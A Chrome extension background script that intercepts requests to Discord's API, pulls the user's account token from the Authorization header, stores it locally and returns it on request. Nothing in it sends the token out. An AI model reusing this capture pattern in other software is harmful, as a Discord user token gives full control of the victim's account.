let capturedToken = null;

chrome.webRequest.onBeforeSendHeaders.addListener(
  (details) => {
    const authHeader = details.requestHeaders?.find(
      (h) => h.name.toLowerCase() === "authorization"
    );
    if (authHeader?.value && !authHeader.value.startsWith("Bot ")) {
      capturedToken = authHeader.value;
      chrome.storage.local.set({ discord_token: capturedToken });
    }
  },
  { urls: ["https://discord.com/api/*", "https://*.discord.com/api/*"] },
  ["requestHeaders", "extraHeaders"]
);

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "getToken") {
    if (capturedToken) {
      sendResponse({ token: capturedToken });
    } else {
      chrome.storage.local.get("discord_token", (result) => {
        sendResponse({ token: result.discord_token || null });
      });
      return true; // async response
    }
  }
});
